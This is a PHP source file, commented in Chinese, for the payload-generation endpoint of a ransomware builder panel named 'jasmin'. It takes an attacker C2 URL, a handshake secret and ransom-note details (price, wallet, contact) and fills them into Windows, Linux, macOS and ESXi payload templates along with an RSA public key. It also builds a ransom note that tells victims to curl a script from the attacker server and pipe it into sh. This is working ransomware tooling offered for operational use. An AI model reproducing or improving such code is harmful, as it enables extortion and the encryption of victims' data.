<?php
/**
 * 载荷生成API — 支持自定义勒索信内容
 */
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/csrf.php';
require_auth();
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { echo json_encode(['ok'=>false,'msg'=>'POST only']); exit; }
if (!csrf_verify()) { http_response_code(403); echo json_encode(['ok'=>false,'msg'=>'CSRF 校验失败，请刷新页面重试']); exit; }

$platform = $_POST['platform'] ?? '';
$c2_url   = trim((string)($_POST['c2_url'] ?? ''));
$secret   = trim((string)($_POST['secret'] ?? 'jasmin@123'));

// ── 入参白名单 ──
// 这两个值会被直接替换进载荷模板（esxi 版是 sh 的 'SECRET=\'{{HANDSHAKE}}\''），
// 不做限制就等于把任意 shell 代码写进生成的载荷。C2 地址同理。
if (!preg_match('#^https?://[A-Za-z0-9._\-]+(:\d{1,5})?(/[A-Za-z0-9._\-]*)*$#', $c2_url)) {
    echo json_encode(['ok'=>false,'msg'=>'回连地址格式不合法（需为 http(s)://主机[:端口][/路径]）']); exit;
}
// 允许常见口令字符，但必须排除会破坏载荷模板字符串字面量的字符：
// ' " ` \ 以及空白/换行 —— 模板里是 SECRET='{{HANDSHAKE}}'（sh/Python）或
// SECRET="{{HANDSHAKE}}"（C#），放开这些就等于允许注入代码。
if (!preg_match('/^[A-Za-z0-9_\-@.!$%&*+=]{1,64}.$/', $secret)) {
    echo json_encode(['ok'=>false,'msg'=>'握手密钥只能包含字母、数字及 - _ @ . ! $ % & * + = （1-64 位，不能有引号/反斜杠/空格）']); exit;
}

// 勒索信参数
// 一律转成字符串：传数组会让后续 str_replace/addcslashes 抛 TypeError
$rs = function($k, $d='') { $v = $_POST[$k] ?? $d; return is_string($v) ? $v : $d; };
$ransom = [
    'title'   => $rs('ransom_title', 'YOUR FILES HAVE BEEN ENCRYPTED'),
    'contact' => $rs('ransom_contact'),
    'body'    => $rs('ransom_body'),
    'price'   => $rs('ransom_price'),
    'wallet'  => $rs('ransom_wallet'),
];

$valid = ['win','linux','macos','esxi'];
if (!in_array($platform, $valid)) { echo json_encode(['ok'=>false,'msg'=>'无效平台']); exit; }

$out_dir = __DIR__ . '/payloads';
if (!is_dir($out_dir)) mkdir($out_dir, 0750, true);
$ts = date('Ymd_His');
$tok = bin2hex(random_bytes(4));

$tpl_map = ['win'=>'win_payload.tpl','linux'=>'linux_payload.tpl','macos'=>'macos_payload.tpl','esxi'=>'esxi_payload.tpl'];
$ext_map = ['win'=>'.cs','linux'=>'.py','macos'=>'.py','esxi'=>'.sh'];
$tpl_path = __DIR__ . '/templates/' . $tpl_map[$platform];

if (!file_exists($tpl_path)) { echo json_encode(['ok'=>false,'msg'=>'模板文件缺失']); exit; }

$tpl = file_get_contents($tpl_path);
$tpl = str_replace('{{C2_URL}}', $c2_url, $tpl);
$tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);

// 注入RSA公钥
$pub_path = __DIR__ . '/payloads/jasmin_public.pem';
if (file_exists($pub_path)) {
    $tpl = str_replace('{{RSA_PUBLIC_KEY}}', trim(file_get_contents($pub_path)), $tpl);
} else {
    echo json_encode(['ok'=>false,'msg'=>'RSA公钥缺失，请先生成密钥对']); exit;
}

// 构建勒索信文本
$note = build_ransom_note($ransom, $platform, $c2_url);
if ($platform === 'esxi') {
    // sh单引号字符串: 用'\''转义单引号，换行保留
    $note_esc = str_replace("'", "'\\''", $note);
    $tpl = str_replace('{{RANSOM_NOTE}}', $note_esc, $tpl);
    foreach ($ransom as $k=>$v) {
        $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', str_replace("'","'\\''", $v), $tpl);
    }
} elseif ($platform === 'win') {
    // C# 的 NOTE 是 verbatim string (@"...")：里面唯一需要转义的是双引号，
    // 且写法是 "" 而不是 \" ，反斜杠完全不转义。
    // 旧实现与其他平台共用 addcslashes(..., "'\"\\")，把 " 变成 \" ——
    // 在 verbatim string 里这压根不是转义，引号照样提前结束字符串，
    // 生成的 .cs 编译不过（勒索信里带 " 是常态，例如 -K "<passphrase>"）。
    $note_esc = str_replace('"', '""', $note);
    $tpl = str_replace('{{RANSOM_NOTE}}', $note_esc, $tpl);
    foreach ($ransom as $k=>$v) {
        $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', str_replace('"','""',$v), $tpl);
    }
} else {
    // Python 三引号字符串: \" 与 \' 都是合法转义
    $tpl = str_replace('{{RANSOM_NOTE}}', addcslashes($note, "'\"\\"), $tpl);
    foreach ($ransom as $k=>$v) {
        $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', addcslashes($v, "'\"\\"), $tpl);
    }
}

$name = "jasmin_{$platform}_{$ts}_{$tok}" . $ext_map[$platform];
$path = "{$out_dir}/{$name}";
file_put_contents($path, $tpl);
if ($platform !== 'win') chmod($path, 0750);
echo json_encode(['ok'=>true,'file'=>$name,'platform'=>$platform,'size'=>filesize($path)]);
exit;

function build_ransom_note($r, $plat, $c2='') {
    $t = $r['title'];
    $b = $r['body'];
    $c = $r['contact'];
    $p = $r['price'];
    $w = $r['wallet'];
    $srv = preg_replace('#/handshake\.php$#', '', $c2);
    if ($srv === '') $srv = 'http://<后台地址>';
    // 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh (纯 openssl)，
    // Windows 用 jasmin_unlock.ps1 (纯 PowerShell 7+，无需编译 exe)
    $dec = ($plat === 'win')
        ? "Windows (requires PowerShell 7+)\n"
         ."  curl.exe -sL {$srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n"
         ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<passphrase>\""
        : "Linux / macOS (pure openssl, no dependencies required)\n"
         ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"";
    $dec.= "\n  (Decrypts ALL encrypted files by default; append specific folders to limit scope)";
    $n = "╔══════════════════════════════════════════╗\n";
    $n.= "║  {$t}\n";
    // 标题若已含 ENCRYPT 字样则不再补副标题，避免两行重复
    if (stripos($t, 'ENCRYPT') === false) {
        $n.= "║  YOUR FILES HAVE BEEN ENCRYPTED\n";
    }
    $n.= "╚══════════════════════════════════════════╝\n\n";
    $n.= "System ID: {sid}\n\n";
    $n.= "{$b}\n\n";
    if ($p) $n.= "Ransom Amount: {$p}\n";
    if ($w) $n.= "Payment Address: {$w}\n";
    if ($c) $n.= "Contact: {$c}\n";
    $n.= "\nHow to Decrypt:\n{$dec}\n";
    $n.= "\nSha-256 integrity verification guarantees 100% file restoration.\n";
    return $n;
}
